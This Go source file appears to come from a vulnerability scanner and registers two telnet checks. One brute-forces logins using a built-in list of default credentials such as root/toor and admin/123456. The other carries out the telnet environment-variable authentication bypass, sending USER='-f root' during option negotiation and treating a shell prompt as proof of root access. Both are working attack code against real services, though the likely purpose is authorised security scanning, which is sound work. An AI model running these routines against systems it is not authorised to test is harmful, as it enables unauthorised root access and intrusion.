package gox

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"strings"
	"time"

	urlutil "github.com/zan8in/pins/url"
)

func init() {
	funcMap["telnet-weak-login"] = telnet_weak_login
	funcMap["telnet-env-user-root"] = telnet_env_user_root
}

func telnet_weak_login(target string, variableMap map[string]any) error {
	variableMap["request"] = nil
	variableMap["response"] = nil

	host, err := resolveTelnetAddress(target)
	if err != nil {
		return err
	}

	usernames := []string{"root", "admin", "administrator", "user", "test", "guest", "support"}
	passwords := []string{"", "root", "admin", "123456", "12345678", "password", "toor", "guest", "111111", "000000", "123123"}

	maxTries := 200
	if v := variableMap["max_tries"]; v != nil {
		if n, ok := v.(int); ok && n > 0 {
			maxTries = n
		}
	}

	tried := 0
	for _, u := range usernames {
		for _, p := range passwords {
			if maxTries > 0 && tried >= maxTries {
				setResponse(fmt.Sprintf("fail;reason=max_tries;tried=%d", tried), variableMap)
				setRequest(host, variableMap)
				setTarget(host, variableMap)
				setFullTarget(host, variableMap)
				return nil
			}
			tried++
			if telnetAuthAttempt(host, u, p) {
				setResponse(fmt.Sprintf("success;user=%s;pass=%s", u, p), variableMap)
				setRequest(host, variableMap)
				setTarget(host, variableMap)
				setFullTarget(host, variableMap)
				return nil
			}
		}
	}

	setResponse(fmt.Sprintf("fail;reason=not_found;tried=%d", tried), variableMap)
	setRequest(host, variableMap)
	setTarget(host, variableMap)
	setFullTarget(host, variableMap)
	return nil
}

func telnetAuthAttempt(host, username, password string) bool {
	conn, err := net.DialTimeout("tcp", host, 5*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(12 * time.Second))
	reader := bufio.NewReader(conn)

	bannerRaw, _ := telnetReadSome(conn, reader, 4096, 1500*time.Millisecond)
	banner := telnetSanitizeText(bannerRaw)

	if strings.TrimSpace(banner) == "" {
		_, _ = fmt.Fprintf(conn, "\r\n")
		moreRaw, _ := telnetReadSome(conn, reader, 4096, 1500*time.Millisecond)
		banner += "\n" + telnetSanitizeText(moreRaw)
	}

	if telnetLooksLikeShell(banner) {
		return true
	}

	needUser := telnetHasLoginPrompt(banner) || (!telnetHasPasswordPrompt(banner) && !telnetHasLoginPrompt(banner))
	if needUser {
		_, _ = fmt.Fprintf(conn, "%s\r\n", username)
	}

	pwRaw, _ := telnetReadSome(conn, reader, 4096, 2000*time.Millisecond)
	pwText := telnetSanitizeText(pwRaw)
	if !telnetHasPasswordPrompt(pwText) && !telnetHasPasswordPrompt(banner) {
		_, _ = fmt.Fprintf(conn, "\r\n")
		pwRaw2, _ := telnetReadSome(conn, reader, 4096, 1500*time.Millisecond)
		pwText += "\n" + telnetSanitizeText(pwRaw2)
	}

	_, _ = fmt.Fprintf(conn, "%s\r\n", password)

	afterRaw, _ := telnetReadSome(conn, reader, 8192, 2500*time.Millisecond)
	after := telnetSanitizeText(afterRaw)

	if telnetHasFailure(after) || telnetHasLoginPrompt(after) || telnetHasPasswordPrompt(after) {
		return false
	}

	_, _ = fmt.Fprintf(conn, "\r\n")
	promptRaw, _ := telnetReadSome(conn, reader, 8192, 1500*time.Millisecond)
	prompt := telnetSanitizeText(promptRaw)

	return telnetLooksLikeShell(after + "\n" + prompt)
}

func telnet_env_user_root(target string, variableMap map[string]any) error {
	variableMap["request"] = nil
	variableMap["response"] = nil

	host, err := resolveTelnetAddress(target)
	if err != nil {
		return err
	}

	ok, output := telnetEnvAuthAttempt(host, "root", "afrog-invalid-password", "-f root")
	if ok {
		setResponse("success;\n"+output, variableMap)
	} else {
		setResponse("fail;\n"+output, variableMap)
	}
	setRequest(host, variableMap)
	setTarget(host, variableMap)
	setFullTarget(host, variableMap)
	return nil
}

func telnetEnvAuthAttempt(host, username, password, envValue string) (bool, string) {
	conn, err := net.DialTimeout("tcp", host, 5*time.Second)
	if err != nil {
		return false, err.Error()
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(60 * time.Second))
	reader := bufio.NewReader(conn)
	state := &telnetEnvState{value: envValue}
	_, _ = conn.Write([]byte{255, 251, 39, 255, 251, 36})

	bannerRaw, _ := telnetReadSomeEnv(conn, reader, 4096, 1500*time.Millisecond, state)
	banner := telnetSanitizeText(bannerRaw)
	if strings.TrimSpace(banner) == "" {
		_, _ = fmt.Fprintf(conn, "\r\n")
		moreRaw, _ := telnetReadSomeEnv(conn, reader, 4096, 1500*time.Millisecond, state)
		banner += "\n" + telnetSanitizeText(moreRaw)
	}

	for i := 0; i < 3 && !telnetLooksLikeShell(banner); i++ {
		extraRaw, _ := telnetReadSomeEnv(conn, reader, 4096, 900*time.Millisecond, state)
		extra := telnetSanitizeText(extraRaw)
		if strings.TrimSpace(extra) == "" {
			_, _ = fmt.Fprintf(conn, "\r\n")
			extraRaw2, _ := telnetReadSomeEnv(conn, reader, 4096, 900*time.Millisecond, state)
			extra = telnetSanitizeText(extraRaw2)
		}
		if strings.TrimSpace(extra) != "" {
			banner += "\n" + extra
		}
	}

	authPromptSeen := telnetHasLoginPrompt(banner) || telnetHasPasswordPrompt(banner)
	if telnetHasLoginEvidence(banner, authPromptSeen) {
		return true, strings.TrimSpace(banner)
	}

	if telnetLooksLikeShell(banner) {
		_, _ = fmt.Fprintf(conn, "\r\n")
		promptRaw, _ := telnetReadSomeEnv(conn, reader, 8192, 1500*time.Millisecond, state)
		prompt := telnetSanitizeText(promptRaw)
		output := strings.TrimSpace(strings.Join([]string{banner, prompt}, "\n"))
		authPromptSeen = authPromptSeen || telnetHasLoginPrompt(prompt) || telnetHasPasswordPrompt(prompt)
		return telnetHasLoginEvidence(output, authPromptSeen), output
	}

	needUser := telnetHasLoginPrompt(banner) || (!telnetHasPasswordPrompt(banner) && !telnetHasLoginPrompt(banner))
	if needUser {
		_, _ = fmt.Fprintf(conn, "%s\r\n", username)
	}

	pwParts := make([]string, 0, 3)
	for i := 0; i < 3; i++ {
		pwRaw, _ := telnetReadSomeEnv(conn, reader, 8192, 2500*time.Millisecond, state)
		pwTextPart := telnetSanitizeText(pwRaw)
		if strings.TrimSpace(pwTextPart) != "" {
			pwParts = append(pwParts, pwTextPart)
		}
		joined := strings.Join(pwParts, "\n")
		if telnetLooksLikeShell(joined) || telnetHasPasswordPrompt(joined) || telnetHasLoginPrompt(joined) {
			break
		}
		_, _ = fmt.Fprintf(conn, "\r\n")
	}
	pwText := strings.TrimSpace(strings.Join(pwParts, "\n"))
	authPromptSeen = authPromptSeen || telnetHasLoginPrompt(pwText) || telnetHasPasswordPrompt(pwText)
	if telnetHasLoginEvidence(strings.TrimSpace(strings.Join([]string{banner, pwText}, "\n")), authPromptSeen) {
		return true, strings.TrimSpace(strings.Join([]string{banner, pwText}, "\n"))
	}

	if telnetLooksLikeShell(pwText) {
		output := strings.TrimSpace(strings.Join([]string{banner, pwText}, "\n"))
		return telnetHasLoginEvidence(output, authPromptSeen), output
	}

	if telnetHasPasswordPrompt(pwText) || telnetHasPasswordPrompt(banner) {
		prePassParts := make([]string, 0, 3)
		for i := 0; i < 3; i++ {
			preRaw, _ := telnetReadSomeEnv(conn, reader, 8192, 3000*time.Millisecond, state)
			pre := telnetSanitizeText(preRaw)
			if strings.TrimSpace(pre) != "" {
				prePassParts = append(prePassParts, pre)
			} else {
				_, _ = fmt.Fprintf(conn, "\r\n")
			}
			preJoined := strings.TrimSpace(strings.Join(prePassParts, "\n"))
			if preJoined != "" {
				authPromptSeen = authPromptSeen || telnetHasLoginPrompt(preJoined) || telnetHasPasswordPrompt(preJoined)
				candidate := strings.TrimSpace(strings.Join([]string{banner, pwText, preJoined}, "\n"))
				if telnetHasLoginEvidence(candidate, authPromptSeen) {
					return true, candidate
				}
				if telnetHasFailure(candidate) {
					return false, candidate
				}
			}
		}

		_, _ = fmt.Fprintf(conn, "%s\r\n", password)
		afterParts := make([]string, 0, 4)
		for i := 0; i < 4; i++ {
			afterRaw, _ := telnetReadSomeEnv(conn, reader, 8192, 2500*time.Millisecond, state)
			afterTextPart := telnetSanitizeText(afterRaw)
			if strings.TrimSpace(afterTextPart) != "" {
				afterParts = append(afterParts, afterTextPart)
			}
			joined := strings.Join(afterParts, "\n")
			if telnetHasFailure(joined) || telnetHasLoginPrompt(joined) || telnetHasPasswordPrompt(joined) || telnetLooksLikeShell(joined) {
				break
			}
			_, _ = fmt.Fprintf(conn, "\r\n")
		}

		after := strings.TrimSpace(strings.Join(afterParts, "\n"))
		authPromptSeen = authPromptSeen || telnetHasLoginPrompt(after) || telnetHasPasswordPrompt(after)
		candidate := strings.TrimSpace(strings.Join([]string{banner, pwText, after}, "\n"))
		if telnetHasLoginEvidence(candidate, authPromptSeen) {
			return true, candidate
		}
		if telnetHasFailure(after) || telnetHasFailure(candidate) {
			return false, candidate
		}
		if telnetHasLoginPrompt(after) || telnetHasPasswordPrompt(after) {
			return false, candidate
		}

		if !telnetLooksLikeShell(after) {
			_, _ = fmt.Fprintf(conn, "\r\n")
			promptRaw, _ := telnetReadSomeEnv(conn, reader, 8192, 2000*time.Millisecond, state)
			prompt := telnetSanitizeText(promptRaw)
			after = strings.TrimSpace(strings.Join([]string{after, prompt}, "\n"))
			authPromptSeen = authPromptSeen || telnetHasLoginPrompt(prompt) || telnetHasPasswordPrompt(prompt)
		}

		if !telnetLooksLikeShell(after) {
			return false, strings.TrimSpace(strings.Join([]string{banner, pwText, after}, "\n"))
		}
		output := strings.TrimSpace(strings.Join([]string{banner, pwText, after}, "\n"))
		return telnetHasLoginEvidence(output, authPromptSeen), output
	}

	return false, strings.TrimSpace(strings.Join([]string{banner, pwText}, "\n"))
}

func telnetHasLoginEvidence(output string, authPromptSeen bool) bool {
	u := strings.ToLower(output)
	if strings.Contains(u, "last login") {
		return true
	}
	if telnetLooksLikeUnixPrompt(output) {
		if strings.Contains(u, "gnu/linux") ||
			strings.Contains(u, "ubuntu") ||
			strings.Contains(u, "debian") ||
			strings.Contains(u, "centos") ||
			strings.Contains(u, "alpine") ||
			strings.Contains(u, "busybox") ||
			strings.Contains(u, "openwrt") {
			return true
		}
		if authPromptSeen {
			return true
		}
	}
	return false
}

func telnetLooksLikeUnixPrompt(s string) bool {
	u := strings.ToLower(strings.TrimSpace(s))
	if u == "" {
		return false
	}
	lines := strings.Split(u, "\n")
	checked := 0
	for i := len(lines) - 1; i >= 0 && checked < 8; i-- {
		line := strings.TrimSpace(lines[i])
		if line == "" {
			continue
		}
		checked++
		if telnetHasFailure(line) {
			return false
		}
		if telnetHasLoginPrompt(line) || telnetHasPasswordPrompt(line) {
			continue
		}
		if telnetLineLooksLikePrompt(line) {
			return true
		}
	}
	return false
}

type telnetEnvState struct {
	value string
	sent  bool
}

func telnetReadSomeEnv(conn net.Conn, reader *bufio.Reader, maxBytes int, extraWait time.Duration, state *telnetEnvState) ([]byte, error) {
	if maxBytes <= 0 {
		maxBytes = 4096
	}

	buf := make([]byte, 0, maxBytes)
	tmp := make([]byte, 1024)

	deadline := time.Now().Add(extraWait)
	_ = conn.SetReadDeadline(deadline)

	for len(buf) < maxBytes {
		n, err := reader.Read(tmp)
		if n > 0 {
			clean := telnetFilterAndReplyEnv(conn, tmp[:n], state)
			if len(clean) > 0 {
				remain := maxBytes - len(buf)
				if len(clean) > remain {
					clean = clean[:remain]
				}
				buf = append(buf, clean...)
			}
		}
		if err != nil {
			break
		}
		if n == 0 {
			break
		}
	}

	return buf, nil
}

func telnetFilterAndReplyEnv(conn net.Conn, data []byte, state *telnetEnvState) []byte {
	if len(data) == 0 {
		return nil
	}

	const (
		iac           = 255
		dont          = 254
		do            = 253
		wont          = 252
		will          = 251
		sb            = 250
		se            = 240
		optEnviron    = 36
		optNewEnviron = 39
		envIs         = 0
		envSend       = 1
		envVar        = 0
		envValue      = 1
		envUserVar    = 3
	)

	out := make([]byte, 0, len(data))
	i := 0
	for i < len(data) {
		if data[i] != iac {
			out = append(out, data[i])
			i++
			continue
		}
		if i+1 >= len(data) {
			break
		}
		cmd := data[i+1]
		switch cmd {
		case do, dont, will, wont:
			if i+2 >= len(data) {
				i = len(data)
				break
			}
			opt := data[i+2]
			if opt == optEnviron || opt == optNewEnviron {
				if cmd == do {
					_, _ = conn.Write([]byte{iac, will, opt})
				} else if cmd == will {
					_, _ = conn.Write([]byte{iac, do, opt})
				} else if cmd == dont {
					_, _ = conn.Write([]byte{iac, wont, opt})
				}
			} else {
				if cmd == do {
					_, _ = conn.Write([]byte{iac, wont, opt})
				} else if cmd == will {
					_, _ = conn.Write([]byte{iac, dont, opt})
				}
			}
			i += 3
		case sb:
			i += 2
			if i >= len(data) {
				break
			}
			opt := data[i]
			i++
			start := i
			for i < len(data) {
				if data[i] == iac && i+1 < len(data) && data[i+1] == se {
					break
				}
				i++
			}
			payload := data[start:i]
			if (opt == optEnviron || opt == optNewEnviron) && len(payload) > 0 && payload[0] == envSend && state != nil && !state.sent {
				env := buildTelnetEnvSubnegotiation(opt, state.value, envIs, envVar, envValue, envUserVar)
				if len(env) > 0 {
					_, _ = conn.Write(env)
					state.sent = true
				}
			}
			for i < len(data) {
				if data[i] == iac && i+1 < len(data) && data[i+1] == se {
					i += 2
					break
				}
				i++
			}
		case iac:
			out = append(out, iac)
			i += 2
		default:
			i += 2
		}
	}

	return out
}

func buildTelnetEnvSubnegotiation(opt byte, value string, envIs, envVar, envValue, envUserVar byte) []byte {
	if strings.TrimSpace(value) == "" {
		return nil
	}
	key := []byte("USER")
	val := []byte(value)
	body := []byte{opt, envIs, envVar}
	if opt == 39 {
		body = []byte{opt, envIs, envUserVar}
	}
	body = append(body, key...)
	body = append(body, envValue)
	body = append(body, val...)
	return append([]byte{255, 250}, append(body, 255, 240)...)
}

func telnetReadSome(conn net.Conn, reader *bufio.Reader, maxBytes int, extraWait time.Duration) ([]byte, error) {
	if maxBytes <= 0 {
		maxBytes = 4096
	}

	buf := make([]byte, 0, maxBytes)
	tmp := make([]byte, 1024)

	deadline := time.Now().Add(extraWait)
	_ = conn.SetReadDeadline(deadline)

	for len(buf) < maxBytes {
		n, err := reader.Read(tmp)
		if n > 0 {
			clean := telnetFilterAndReply(conn, tmp[:n])
			if len(clean) > 0 {
				remain := maxBytes - len(buf)
				if len(clean) > remain {
					clean = clean[:remain]
				}
				buf = append(buf, clean...)
			}
		}
		if err != nil {
			break
		}
		if n == 0 {
			break
		}
	}

	return buf, nil
}

func telnetFilterAndReply(conn net.Conn, data []byte) []byte {
	if len(data) == 0 {
		return nil
	}

	const (
		iac  = 255
		dont = 254
		do   = 253
		wont = 252
		will = 251
		sb   = 250
		se   = 240
	)

	out := make([]byte, 0, len(data))
	i := 0
	for i < len(data) {
		if data[i] != iac {
			out = append(out, data[i])
			i++
			continue
		}

		if i+1 >= len(data) {
			break
		}
		cmd := data[i+1]
		switch cmd {
		case do, dont, will, wont:
			if i+2 >= len(data) {
				i = len(data)
				break
			}
			opt := data[i+2]
			if cmd == do {
				_, _ = conn.Write([]byte{iac, wont, opt})
			} else if cmd == will {
				_, _ = conn.Write([]byte{iac, dont, opt})
			}
			i += 3
		case sb:
			i += 2
			for i < len(data) {
				if data[i] == iac && i+1 < len(data) && data[i+1] == se {
					i += 2
					break
				}
				i++
			}
		case iac:
			out = append(out, iac)
			i += 2
		default:
			i += 2
		}
	}

	return out
}

func telnetSanitizeText(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	s := string(bytes.ReplaceAll(b, []byte{0}, []byte{}))
	s = strings.ReplaceAll(s, "\r", "\n")
	s = strings.ReplaceAll(s, "\n\n", "\n")
	return s
}

func telnetHasLoginPrompt(s string) bool {
	u := strings.ToLower(s)
	return strings.Contains(u, "login:") || strings.Contains(u, "username:") || strings.Contains(u, "user:")
}

func telnetHasPasswordPrompt(s string) bool {
	u := strings.ToLower(s)
	return strings.Contains(u, "password:") || strings.Contains(u, "pass:")
}

func telnetHasFailure(s string) bool {
	u := strings.ToLower(s)
	bad := []string{
		"login incorrect",
		"authentication failed",
		"invalid password",
		"incorrect password",
		"incorrect",
		"failed",
		"denied",
		"bad password",
	}
	for _, b := range bad {
		if strings.Contains(u, b) {
			return true
		}
	}
	return false
}

func telnetHasAlphaNum(s string) bool {
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			return true
		}
	}
	return false
}

func telnetLineLooksLikePrompt(line string) bool {
	l := strings.TrimSpace(strings.ToLower(line))
	if l == "" {
		return false
	}
	last := l[len(l)-1]
	if last != '#' && last != '$' && last != '>' {
		return false
	}
	if l == "#" || l == "$" || l == ">" {
		return true
	}
	base := strings.TrimSpace(l[:len(l)-1])
	if base == "" {
		return false
	}
	if !telnetHasAlphaNum(base) {
		return false
	}
	if strings.Contains(base, "@") || strings.Contains(base, ":") || strings.Contains(base, "~") || strings.Contains(base, "/") {
		return true
	}
	if len(base) <= 32 {
		return true
	}
	return false
}

func telnetLooksLikeShell(s string) bool {
	u := strings.ToLower(strings.TrimSpace(s))
	if u == "" {
		return false
	}
	lines := strings.Split(u, "\n")
	checked := 0
	for i := len(lines) - 1; i >= 0 && checked < 8; i-- {
		line := strings.TrimSpace(lines[i])
		if line == "" {
			continue
		}
		checked++
		if telnetHasFailure(line) {
			return false
		}
		if telnetHasLoginPrompt(line) || telnetHasPasswordPrompt(line) {
			continue
		}
		if telnetLineLooksLikePrompt(line) {
			return true
		}
		if strings.Contains(line, "last login") {
			return true
		}
	}
	return false
}

func telnetLooksLikeShellTail(s string) bool {
	u := strings.ToLower(strings.TrimSpace(s))
	if u == "" {
		return false
	}
	lines := strings.Split(u, "\n")
	checked := 0
	for i := len(lines) - 1; i >= 0 && checked < 8; i-- {
		line := strings.TrimSpace(lines[i])
		if line == "" {
			continue
		}
		checked++
		if telnetHasFailure(line) {
			return false
		}
		if telnetHasLoginPrompt(line) || telnetHasPasswordPrompt(line) {
			continue
		}
		if telnetLineLooksLikePrompt(line) {
			return true
		}
		if strings.Contains(line, "last login") {
			return true
		}
	}
	return false
}

func resolveTelnetAddress(target string) (string, error) {
	host, err := urlutil.Host(target)
	if err != nil {
		hostname, herr := urlutil.Hostname(target)
		if herr != nil {
			return "", herr
		}
		return fmt.Sprintf("%s:%d", hostname, 23), nil
	}
	if !hasPort(host) {
		return fmt.Sprintf("%s:%d", host, 23), nil
	}
	return host, nil
}
